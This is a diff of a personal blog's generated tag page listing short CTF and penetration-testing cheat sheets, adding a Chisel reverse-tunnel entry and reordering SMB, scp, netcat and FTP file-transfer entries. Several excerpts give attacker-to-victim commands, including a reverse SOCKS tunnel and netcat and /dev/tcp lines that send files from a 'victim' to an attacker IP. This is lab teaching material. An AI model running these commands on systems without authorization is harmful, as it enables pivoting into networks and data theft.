@@ -173,77 +173,17 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">📁 File Sharing Over SMB Using `smbserver.py`
+    <h2 class="entry-hint-parent">Chisel Port Forwarding Guide
     </h2>
   </header>
   <div class="entry-content">
-    <p> 🖥️ On the Linux Server (Attacker Machine) Start an SMB server using impacket-smbserver:
-sudo smbserver.py gnu $(pwd) -smb2support gnu: Share name $(pwd): Current working directory to be shared -smb2support: Enables SMB2 support for better compatibility with newer Windows systems 🪟 On the Windows Client (Victim Machine) Access the shared file using UNC path:
-\\10.10.14.42\gnu\winPEAS.exe 🔸 Replace 10.10.14.42 with the IP of your Linux (attacker) machine 🔸 You can also map this as a network drive or copy files directly using copy or xcopy in CMD or PowerShell
+    <p> 🧠 What is Chisel? Chisel is a fast TCP/UDP tunnel over HTTP, useful for port forwarding and pivoting, especially during red teaming or CTFs.
+🔥 Attacker Machine Setup (Chisel Server) Start Chisel in reverse mode on the attacker machine:
+./chisel_1.5.1 server -p 9005 --reverse -p 9005: Listen on port 9005 --reverse: Accept reverse port forwarding connections 🎯 Target Machine Setup (Chisel Client) Forward all traffic to attacker: ./chisel client 10.10.14.19:9005 R:socks This sets up a SOCKS proxy from the target to the attacker’s Chisel server
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 📁 File Sharing Over SMB Using `smbserver.py`" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/smb-using-smbserver.py/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">📁 File Transfer Using Netcat
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>🖥️ Step 1: Start Listening on Local Machine (Kali) Run the following command to start listening for incoming files:
-nc -lp 4444 &gt; filename # waiting for receiving the files 📤 Step 2: Transfer File from Remote Machine (Victim) Run this command on the victim machine to send the file:
-nc -w 3 10.10.14.19 4444 &lt; filename # it&#39;s time to send the file OR, use this alternative method:
-cat filename &gt; /dev/tcp/10.10.14.19/4444 Note: 10.10.14.19 is the IP address of the local machine (tun0).
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 📁 File Transfer Using Netcat" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/netcat/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">📡 File Transfer via FTP on Linux
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> 🧰 Using ftp Command 1. Connect to FTP Server Replace 10.10.10.98 with your target FTP server IP or domain:
-ftp 10.10.10.98 2. Login as Anonymous Name (10.10.10.98:yourusername): anonymous Password: (press Enter) 3. Set Binary Mode To handle all types of files properly:
-ftp&gt; binary 4. Disable Prompting (for Multiple Files) ftp&gt; prompt off Interactive mode off. 5. Download Files (Wildcard) ftp&gt; mget * ⚠️ Note: Standard ftp does not support recursive download. For recursive download, use a better client like lftp.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 📡 File Transfer via FTP on Linux" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/ftp-on-linux/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">📡 Wi-Fi Handshake Capture Guide using aircrack-ng Tools
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> 🔍 1. Scan Available WiFi Networks 🌐 Scan all nearby WiFi networks sudo airodump-ng mon0 📶 Scan only 2.4 GHz networks (802.11b/g) sudo airodump-ng --band bg mon0 📡 Scan only 5 GHz networks (802.11a) sudo airodump-ng --band a mon0 📋 Band Option Summary --band a → 5 GHz (802.11a) --band b → 2.4 GHz (802.11b) --band g → 2.4 GHz (802.11g) --band bg → All 2.4 GHz (recommended) --band abg → Both 2.4 GHz and 5 GHz 🎯 2. Capture WPA/WPA2 Handshake 🎯 Start listening on target AP # Replace &lt;channel&gt;, &lt;BSSID&gt;, and &lt;output_filename&gt; sudo airodump-ng -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;output_filename&gt; mon0 Example
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to 📡 Wi-Fi Handshake Capture Guide using aircrack-ng Tools" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/wi-fi-handshake-capture-guide-using-aircrack-ng-tools/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">🔐 File Transfer Over SSH Using `scp`
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> 📤 Uploading/Sending a Directory from Local to SSH Server Use either of the following commands:
-scp -P 22 -r ./shell/* u0_a418@192.168.0.20:/home/gnu/shell/ OR
-scp -r -P 22 ./shell u0_a418@192.168.0.20:/home/gnu/shell/ 📥 Downloading/Receiving a Directory from SSH Server to Local scp -P 22 -r u0_a418@192.168.0.20:/home/gnu/* ./gnu/ OR
-scp -r -P 22 u0_a418@192.168.0.20:/home/gnu ./gnu/ 📤 Uploading/Sending a File from Local to SSH Server scp -P 22 ./shell.php u0_a418@192.168.0.20:/home/gnu/shell.php 📥 Downloading/Receiving a File from SSH Server to Local scp -P 22 u0_a418@192.168.0.20:/home/gnu/flag.txt ./flag.txt 📝 Note:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🔐 File Transfer Over SSH Using `scp`" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/"></a>
+  <a class="entry-link" aria-label="post link to Chisel Port Forwarding Guide" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -272,6 +212,68 @@ sudo pacman -S garuda/garuda-tools-base-git This package is only available for G
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
   <a class="entry-link" aria-label="post link to Easy Guide to Fixing GRUB on Garuda Linux (BTRFS)" href="http://localhost:1313/posts/tipsandtricks/archlinux/fix_grub_on_garuda_linux/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">File Sharing Over SMB Using `smbserver.py`
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> 🖥️ On the Linux Server (Attacker Machine) Start an SMB server using impacket-smbserver:
+sudo smbserver.py gnu $(pwd) -smb2support gnu: Share name $(pwd): Current working directory to be shared -smb2support: Enables SMB2 support for better compatibility with newer Windows systems 🪟 On the Windows Client (Victim Machine) Access the shared file using UNC path:
+\\10.10.14.42\gnu\winPEAS.exe 🔸 Replace 10.10.14.42 with the IP of your Linux (attacker) machine 🔸 You can also map this as a network drive or copy files directly using copy or xcopy in CMD or PowerShell
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to File Sharing Over SMB Using `smbserver.py`" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/smb-using-smbserver.py/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">File Transfer Over SSH Using `scp`
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> 📤 Uploading/Sending a Directory from Local to SSH Server Use either of the following commands:
+scp -P 22 -r ./shell/* u0_a418@192.168.0.20:/home/gnu/shell/ OR
+scp -r -P 22 ./shell u0_a418@192.168.0.20:/home/gnu/shell/ 📥 Downloading/Receiving a Directory from SSH Server to Local scp -P 22 -r u0_a418@192.168.0.20:/home/gnu/* ./gnu/ OR
+scp -r -P 22 u0_a418@192.168.0.20:/home/gnu ./gnu/ 📤 Uploading/Sending a File from Local to SSH Server scp -P 22 ./shell.php u0_a418@192.168.0.20:/home/gnu/shell.php 📥 Downloading/Receiving a File from SSH Server to Local scp -P 22 u0_a418@192.168.0.20:/home/gnu/flag.txt ./flag.txt 📝 Note:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to File Transfer Over SSH Using `scp`" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">File Transfer Using Netcat
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>🖥️ Step 1: Start Listening on Local Machine (Kali) Run the following command to start listening for incoming files:
+nc -lp 4444 &gt; filename # waiting for receiving the files 📤 Step 2: Transfer File from Remote Machine (Victim) Run this command on the victim machine to send the file:
+nc -w 3 10.10.14.19 4444 &lt; filename # it&#39;s time to send the file OR, use this alternative method:
+cat filename &gt; /dev/tcp/10.10.14.19/4444 Note: 10.10.14.19 is the IP address of the local machine (tun0).
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to File Transfer Using Netcat" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/netcat/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">File Transfer via FTP on Linux
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> 🧰 Using ftp Command 1. Connect to FTP Server Replace 10.10.10.98 with your target FTP server IP or domain:
+ftp 10.10.10.98 2. Login as Anonymous Name (10.10.10.98:yourusername): anonymous Password: (press Enter) 3. Set Binary Mode To handle all types of files properly:
+ftp&gt; binary 4. Disable Prompting (for Multiple Files) ftp&gt; prompt off Interactive mode off. 5. Download Files (Wildcard) ftp&gt; mget * ⚠️ Note: Standard ftp does not support recursive download. For recursive download, use a better client like lftp.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to File Transfer via FTP on Linux" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/ftp-on-linux/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -353,7 +355,9 @@ showmount -e $IP # List the exported directories on the NFS server Mounting rpcb
 
     <section>
         <h2>Trending Tags</h2>
-                                                                                                                                                                                    
+              
+        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
+                                                                                                                                                                                                                                                            
         <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                    
     </section>
